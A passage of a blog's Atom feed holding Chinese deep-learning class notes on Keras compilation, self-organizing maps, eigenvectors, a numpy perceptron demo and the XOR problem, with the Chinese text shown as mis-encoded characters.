class="string">'categorical_crossentropy'</span>,</span><br><span class="line">              optimizer=<span class="string">'sgd'</span>,</span><br><span class="line">              metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line"><span class="comment"># x_train å’Œ y_train æ˜¯ Numpy æ•°ç»„ -- å°±åƒåœ¨ Scikit-Learn API ä¸­ä¸€æ ·ã€‚</span></span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>, batch_size=<span class="number">32</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">è¯„ä¼°æ¨¡å‹</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">loss_and_metrics = model.evaluate(x_test, y_test, batch_size=<span class="number">128</span>)</span><br><span class="line">classes = model.predict(x_test, batch_size=<span class="number">128</span>)</span><br></pre></td></tr></table></figure></p><h3>Sequential</h3><h3>compile</h3><p>åœ¨è®­ç»ƒæ¨¡å‹ä¹‹å‰ï¼Œéœ€è¦é…ç½®å­¦ä¹ è¿‡ç¨‹ï¼Œcompileæ¥æ”¶ä¸‰ä¸ªå‚æ•°</p><ul><li>ä¼˜åŒ–å™¨optimizer</li><li>æŸå¤±å‡½æ•°loss</li><li>è¯„ä¼°æ ‡å‡†metrics</li></ul><p>ä¸€ä¸ªä¸ªæ¥çœ‹</p><ol><li><p>ä¼˜åŒ–å™¨å¯ä»¥å…ˆå®ä¾‹åŒ–ä¸€ä¸ªä¼˜åŒ–å™¨å¯¹è±¡ï¼Œç„¶åå°†å®ƒä¼ å…¥<code>model.compile()</code>ï¼Œæˆ–è€…å¯ä»¥é€šè¿‡</p></li><li><p>æŸå¤±å‡½æ•°</p></li></ol><p>æŸå¤±å‡½æ•°ï¼ˆæˆ–ç§°ç›®æ ‡å‡½æ•°ã€ä¼˜åŒ–è¯„åˆ†å‡½æ•°ï¼‰æ˜¯ç¼–è¯‘æ¨¡å‹æ—¶æ‰€éœ€çš„ä¸¤ä¸ªå‚æ•°ä¹‹ä¸€ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.compile(loss=<span class="string">'mean_squared_error'</span>, optimizer=<span class="string">'sgd'</span>)</span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬å¯ä»¥ä¼ é€’ä¸€ä¸ªç°æœ‰çš„æŸå¤±å‡½æ•°åï¼Œæˆ–è€…ä¸€ä¸ªtensorflowç¬¦å·å‡½æ•°ï¼Œæœ‰ä»¥ä¸‹ä¸¤ä¸ªå‚æ•°</p><ul><li>y_true: çœŸå®æ ‡ç­¾.</li><li>y_pred: é¢„æµ‹å€¼,å…¶shapeä¸y_trueç›¸åŒ</li></ul><p>å¯ç”¨çš„æŸå¤±å‡½æ•°ï¼šmean_squared_errormean_absolute_errorç­‰</p><h2>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/xwd18280820053/article/details/70681750" target="_blank" rel="noopener">ç¥ç»ç½‘ç»œä¸­w,bå‚æ•°çš„ä½œç”¨ï¼ˆä¸ºä½•éœ€è¦åç½®bçš„è§£é‡Šï¼‰</a><a href="https://blog.csdn.net/hy13684802853/article/details/78717475" target="_blank" rel="noopener">æ·±åº¦å­¦ä¹ ä¸­åç§»é¡¹biasçš„ä½œç”¨</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;æ„ŸçŸ¥æœºè¡¥å……&lt;/h3&gt;
&lt;p&gt;æ¥ç€å†™&lt;/p&gt;
&lt;p&gt;æ„ŸçŸ¥æœºçš„è®­ç»ƒä¸­ï¼Œè€å¸ˆè¿˜æä¾›äº†ä¸€éƒ¨ä»½èµ„æ–™ï¼Œæ¯”å¦‚è®­ç»ƒå‡º$y=2x$&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç®€è¦åœ°çœ‹ä¸€ä¸‹ä¸€æ¬¡è®­ç»ƒçš„ç»“æœï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;bias&lt;/th&gt;
&lt;th&gt;x&lt;/th&gt;
&lt;th&gt;y
      
    
    </summary>
    
      <category term="deep learning" scheme="https://prontosil.club/categories/deep-learning/"/>
    
    
  </entry>
  
  <entry>
    <title>deep learning0</title>
    <link href="https://prontosil.club/2019/07/21/deep-learning0/"/>
    <id>https://prontosil.club/2019/07/21/deep-learning0/</id>
    <published>2019-07-21T08:07:44.000Z</published>
    <updated>2019-07-22T05:26:27.393Z</updated>
    
    <content type="html"><![CDATA[<h1>deep learning</h1><p>æ•´ç†ä¸€ä¸‹ä¸Šè¯¾çš„ç¬”è®°ï¼Œä¸ç„¶å…¨éƒ½ä¼šå¿˜äº†å»</p><h2>æ— ç›‘ç£å­¦ä¹ </h2><p><code>self organizing map</code> ç®€ç§°SOMç®—æ³•</p><p>å¤§æ„ï¼šç»™å®šä¸€ä¸ªå‘é‡$v_{k}$,å¯»æ‰¾åˆ°è·ç¦»æœ€è¿‘çš„ç¥ç»å…ƒ</p><ul><li><p>æ‰¾åˆ°æœ€æ¥è¿‘çš„ç¥ç»å…ƒ$$n_{bmu}=\underset{1\leqslant i\leqslant m}{argmin}\left | v_{k}-n_{i} \right |$$</p></li><li><p>æ›´æ–°$n_{i}$</p></li></ul><p>wikipediaä¸Šä¸€å¼ å¾ˆå½¢è±¡çš„å›¾ç‰‡:</p><blockquote><p>è“è‰²æ–‘ç‚¹æ˜¯è®­ç»ƒæ•°æ®çš„åˆ†å¸ƒï¼Œå°ç™½è‰²å…‰ç›˜æ˜¯ä»è¯¥åˆ†å¸ƒä¸­æŠ½å–çš„å½“å‰è®­ç»ƒæ•°æ®ã€‚é¦–å…ˆï¼ˆå·¦ï¼‰ï¼ŒSOMèŠ‚ç‚¹ä»»æ„åœ°ä½äºæ•°æ®ç©ºé—´ä¸­ã€‚é€‰æ‹©æœ€æ¥è¿‘è®­ç»ƒåŸºå‡†çš„èŠ‚ç‚¹ï¼ˆä»¥é»„è‰²çªå‡ºæ˜¾ç¤ºï¼‰ã€‚å®ƒè¢«ç§»å‘è®­ç»ƒæ•°æ®ï¼Œå› ä¸ºï¼ˆåœ¨è¾ƒå°ç¨‹åº¦ä¸Šï¼‰æ˜¯å®ƒåœ¨ç½‘æ ¼ä¸Šçš„é‚»å±…ã€‚åœ¨å¤šæ¬¡è¿­ä»£ä¹‹åï¼Œç½‘æ ¼å€¾å‘äºè¿‘ä¼¼æ•°æ®åˆ†å¸ƒï¼ˆå³ï¼‰ã€‚</p></blockquote><p><img src="https://i.loli.net/2019/07/07/5d22023bd954e64199.png" alt=""></p><h2>æœ‰ç›‘ç£å­¦ä¹ </h2><h3>æ•°å­¦çŸ¥è¯†</h3><h4>ç‰¹å¾å‘é‡</h4><p>çº¿æ€§ä»£æ•°ä¸­çš„ç‰¹å¾å‘é‡ï¼š</p><blockquote><p>å¯¹äºä¸€ä¸ªç»™å®šçš„æ–¹é˜µAï¼Œå®ƒçš„ç‰¹å¾å‘é‡vç»è¿‡çº¿æ€§å˜åŒ–ä¹‹åï¼Œå¾—åˆ°çš„æ–°å‘é‡ä»ç„¶ä¸åŸæ¥çš„vä¿æŒåœ¨åŒä¸€æ¡ç›´çº¿ä¸Šï¼Œä½†å…¶é•¿åº¦æˆ–æ–¹å‘ä¹Ÿè®¸ä¼šæ”¹å˜ï¼Œå³ï¼š$$Av=\lambda v$$æ­¤æ—¶$v$å°±æ˜¯çŸ©é˜µ$A$çš„ç‰¹å¾å‘é‡ï¼Œ$\lambda$å°±æ˜¯å¯¹åº”çš„ç‰¹å¾å€¼</p></blockquote><p>è¿›ä¸€æ­¥ï¼šåœ¨ä¸€å®šæ¡ä»¶ä¸‹ï¼Œä¸€ä¸ªå˜æ¢å¯ä»¥ç”±å…¶ç‰¹å¾å€¼ç‰¹å¾å‘é‡å®Œå…¨è¡¨è¿°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰çš„ç‰¹å¾å‘é‡ç»„æˆäº†è¿™å‘é‡ç©ºé—´çš„ä¸€ç»„åŸºåº•ã€‚ä¸€ä¸ªç‰¹å¾ç©ºé—´æ˜¯å…·æœ‰ç›¸åŒç‰¹å¾å€¼çš„ç‰¹å¾å‘é‡ä¸ä¸€ä¸ªåŒç»´æ•°çš„é›¶å‘é‡çš„é›†åˆï¼Œæ¯”å¦‚$E_{\lambda }=\left { u\in V | Au=\lambda u\right }$å³ä¸ºçº¿æ€§å˜åŒ–$A$ä¸­ä»¥$\lambda$ä¸ºç‰¹å¾å€¼çš„ç‰¹å¾ç©ºé—´</p><p>æŠ½è±¡æ¦‚å¿µä¸å®¹æ˜“ç†è§£ï¼Œä¸¾å‡ ä¸ªæ —å­ï¼š</p><ul><li>æ’ç­‰å˜æ¢$I$çš„ç‰¹å¾å‘é‡$$I(v)=v=1\cdot v$$å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„ç‰¹å¾å‘é‡éƒ½æ˜¯æ’ç­‰å˜æ¢$I$çš„ç‰¹å¾å‘é‡ï¼Œæ’ç­‰å˜æ¢çš„ç‰¹å¾ç©ºé—´åªæœ‰ä¸€ä¸ªå°±æ˜¯æ•´ä¸ªç©ºé—´</li><li>ç±»ä¼¼çš„ï¼Œæ•°ä¹˜å˜æ¢$\lambda I$çš„ç‰¹å¾å‘é‡ä¹Ÿæ˜¯æ‰€æœ‰çš„éé›¶å‘é‡ï¼Œå› ä¸ºæŒ‰ç…§å®šä¹‰ï¼š$$\lambda I(v) = \lambda \cdot v$$</li></ul><h3>æ„ŸçŸ¥å™¨</h3><p>çœ‹å¼ å›¾ï¼š</p><p><img src="https://i.imgur.com/Uo24IIn.png" alt="Ncell"></p><p>æ•°å­¦è¡¨è¿°ä¸ºï¼š$t = f(\sum <em>{i=1}^{n} w</em>{i}x_{i} + b) = f(\mathbf{w}^{T} \mathbf{x})$</p><p>få‡½æ•°çš„è¡¨è¾¾å¼ï¼š$$f(x) = \left{\begin{matrix}1 &amp; if , w \cdot x + b &gt; 0 \0 &amp; else\end{matrix}\right.$$</p><p>$\mathbf{x} = \left [ x_{1}, x_{2} ... , x_{n} , \ 1 \right]^{T}$, $\mathbf{w} = \left [ w_{1}, w_{2} , ...w_{n} , \ b \right]^{T}$</p><p>å¦‚ä½•è®­ç»ƒï¼Ÿ</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªè®­ç»ƒä¸è¿ç®—çš„demo<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="string">'''</span></span><br><span class="line"><span class="string">  åŠ è½½æ•°æ®ï¼Œinput_dataå’Œlabelså¯¹åº”</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">    input_data = [[<span class="number">1</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>]]</span><br><span class="line">    labels = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> input_data, labels</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_pre</span><span class="params">(input_data, y, iteration, rate)</span>:</span></span><br><span class="line">  <span class="string">'''</span></span><br><span class="line"><span class="string">  è®­ç»ƒï¼Œæ›´æ–°wå’Œb</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">    unit_step = <span class="keyword">lambda</span> x: <span class="number">0</span> <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    w = np.random.rand(len(input_data[<span class="number">0</span>]))</span><br><span class="line">    bias = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(iteration):</span><br><span class="line">        samples = zip(input_data, y)</span><br><span class="line">        <span class="keyword">for</span> (input_i, label) <span class="keyword">in</span> samples:</span><br><span class="line">            result = input_i * w + bias</span><br><span class="line">            result = float(sum(result))</span><br><span class="line">            y_pred = float(unit_step(result))</span><br><span class="line">            w = w + rate * (label - y_pred) * np.array(input_i)</span><br><span class="line">            bias = rate * (label - y_pred)</span><br><span class="line">    <span class="keyword">return</span> w, bias</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(input_i, w, b)</span>:</span></span><br><span class="line">  <span class="string">'''</span></span><br><span class="line"><span class="string">  é¢„æµ‹</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">    unit_step = <span class="keyword">lambda</span> x: <span class="number">0</span> <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    result = input_i * w + b</span><br><span class="line">    result = sum(result)</span><br><span class="line">    y_pred = float(unit_step(result))</span><br><span class="line">    print(y_pred)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    input_data, y = load_data()</span><br><span class="line">    w, b = train_pre(input_data, y, <span class="number">20</span>, <span class="number">0.01</span>)</span><br><span class="line">    predict([<span class="number">1</span>, <span class="number">1</span>], w, b)</span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬å¾ˆæƒŠè®¶åœ°å‘ç°ä¸€ä¸ªå¦‚æ­¤ç®€å•åœ°æ¨¡å‹ç«Ÿç„¶ä¸å¯æ€è®®åœ°å®Œæˆäº†è¿™ä¸ªä»»åŠ¡ã€‚æ•°æ®æ›´æ–°ï¼š$w(j) := w(j) + \alpha (y-f(x))x(j) (j = 1,...n)$</p><h3>å¼‚æˆ–é—®é¢˜</h3><p>å½“æ—¶è€å¸ˆä¸Šè¯¾æ—¶å€™æåˆ°å¼‚æˆ–é—®é¢˜æ˜¯ä¸å¯è§£çš„ï¼Œåæ¥æŸ¥äº†ä¸€ä¸‹èµ„æ–™æ‰æ˜ç™½åœ¨ç¥ç»ç½‘ç»œå‘å±•çš„æ—©æœŸï¼Œå¼‚æˆ–é—®é¢˜ç¡®å®æ˜¯ä¸å¯è§£çš„ï¼Œä¸è¿‡é€šè¿‡åŠ å…¥éšè—å±‚ä½¿å¾—å¼‚æˆ–é—®é¢˜èƒ½å¤Ÿæœ‰äº†æ–°çš„è§£æ³•</p><p>å¦‚ä¸‹å›¾ï¼š<img src="https://i.loli.net/2019/07/07/5d2204580b53040600.png" alt=""></p><p>å¤ä¹ çš„æ—¶å€™æ‰æ³¨æ„åˆ°åŸæ¥è€å¸ˆæåˆ°äº†é€šè¿‡åŠ å…¥éšè—å±‚çš„æ–¹å¼æ¥è§£å†³å¼‚æˆ–é—®é¢˜</p><p><img src="https://i.loli.net/2019/07/07/5d220559de3ef92755.png" alt=""></p><h2>å‚è€ƒèµ„æ–™</h2><p><a href="https://www.cnblogs.com/Belter/p/6711160.html" target="_blank" rel="noopener">ã€æœºå™¨å­¦ä¹ ã€‘ç¥ç»ç½‘ç»œå®ç°å¼‚æˆ–ï¼ˆXORï¼‰</a><a href="https://zhuanlan.zhihu.com/p/25736962" target="_blank" rel="noopener">1.5 å›¾å½¢åŒ–ç†è§£ç¥ç»ç½‘ç»œä¸­çš„å¼‚æˆ–é—®é¢˜</a><a href="https://zh.wikipedia.org/wiki/%E6%84%9F%E7%9F%A5%E5%99%A8" target="_blank" rel="noopener">æ„ŸçŸ¥å™¨ wikipedia</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;deep learning&lt;/h1&gt;
&lt;p&gt;æ•´ç†ä¸€ä¸‹ä¸Šè¯¾çš„ç¬”è®°ï¼Œä¸ç„¶å…¨éƒ½ä¼šå¿˜äº†å»&lt;/p&gt;
&lt;h2&gt;æ— ç›‘ç£å­¦ä¹ &lt;/h2&gt;
&lt;p&gt;&lt;code&gt;self organizing map&lt;/code&gt; ç®€ç§°SOMç®—æ³•&lt;/p&gt;
&lt;p&gt;å¤§æ„ï¼šç»™å®šä¸€ä¸ªå‘é‡$v_{k}$,å¯»æ‰¾åˆ°è·ç¦»æœ€è¿‘çš„
      
    
    </summary>
    
      <category term="deep learning" scheme="https://prontosil.club/categories/deep-learning/"/>
    
    
  </entry>
  
</feed>
